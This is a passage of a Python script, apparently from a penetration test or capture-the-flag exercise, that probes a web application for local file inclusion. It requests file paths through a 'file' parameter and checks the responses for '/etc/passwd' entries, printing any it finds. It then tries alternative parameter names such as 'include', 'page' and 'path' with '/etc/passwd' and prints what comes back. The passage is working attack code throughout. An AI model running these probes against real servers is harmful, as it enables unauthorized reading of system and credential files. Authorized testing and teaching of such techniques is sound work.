    try:
        response = requests.get(target_url, params={"file": path}, timeout=5)
        print(f"\n[*] Testing: {path}")
        print(f"    Status: {response.status_code} | Length: {len(response.text)}")
        
        # Look for indicators that file content was read
        if "root:" in response.text:
            print(f"    [SUCCESS] /etc/passwd content found!")
            # Extract and display the passwd entries
            passwd_lines = [line for line in response.text.split('\n') if line.startswith('root:') or ':x:' in line][:5]
            for line in passwd_lines:
                print(f"    {line}")
        elif "<?php" in response.text or "<!DOCTYPE" in response.text[:100] and len(response.text) > 1000:
            print(f"    [SUCCESS] PHP/HTML file content (large response)")
            print(f"    Content preview: {response.text[:300]}...")
        else:
            print(f"    Response preview: {response.text[:300]}...")
            
    except Exception as e:
        print(f"    [!] Error: {str(e)}")

print("\n" + "=" * 60)
print("[*] Now checking if there's a different injection point or parameter")

# Check the source of private.php previously retrieved to understand structure
# and test alternative approaches
alternative_params = ["page", "path", "include", "view", "location", "read", "load", "f"]

print("[*] Testing alternative parameter names with /etc/passwd")
for param in alternative_params:
    try:
        response = requests.get(target_url, params={param: "/etc/passwd"}, timeout=5)
        if "root:" in response.text:
            print(f"    [FOUND] Parameter '{param}' works!")
            print(f"    Content: {response.text[:500]}")
    except:
        pass

print("\n[*] Checking response for /etc/passwd with full output")
